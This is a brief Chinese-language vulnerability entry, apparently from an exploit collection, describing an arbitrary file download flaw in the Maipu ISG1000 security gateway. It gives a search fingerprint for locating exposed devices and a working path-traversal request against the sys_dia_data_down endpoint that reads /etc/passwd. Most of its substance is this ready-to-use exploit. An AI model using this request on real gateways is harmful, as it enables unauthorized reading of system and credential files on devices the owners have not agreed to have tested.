# 迈普 ISG1000安全网关 sys_dia_data_down 任意文件下载漏洞

## 漏洞描述

迈普 ISG1000安全网关 存在任意文件下载漏洞，攻击者通过漏洞可以获取服务器任意文件

## 漏洞影响

<a-checkbox checked>迈普 ISG1000安全网关</a-checkbox></br>

## 网络测绘

<a-checkbox checked>title="迈普通信技术股份有限公司"</a-checkbox></br>

## 漏洞复现

登录页面如下



![img](../../../.vuepress/public/img/image-20210604151806596.png)



请求的 POC 为



```plain
/webui/?g=sys_dia_data_down&file_name=../etc/passwd
```



![img](../../../.vuepress/public/img/image-20210604152228481.png)



若有收获，就点个赞吧